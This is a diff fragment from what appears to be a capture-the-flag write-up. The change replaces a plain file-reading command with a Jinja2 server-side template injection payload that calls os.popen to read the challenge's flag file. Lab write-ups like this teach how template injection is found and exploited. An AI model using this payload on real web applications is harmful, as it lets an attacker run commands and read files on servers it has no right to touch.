@@ -76,7 +76,7 @@ drwxr-xr-x 2 root root 32 Mar 17 13:49 __pycache__
 Since the `flag` file had read permissions for all users (`rw-r--r--`), we could directly access and read it:
 
 ```bash
-cat /challenge/flag
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /challenge/flag').read() }}
 ```
 
 **Flag Output**:
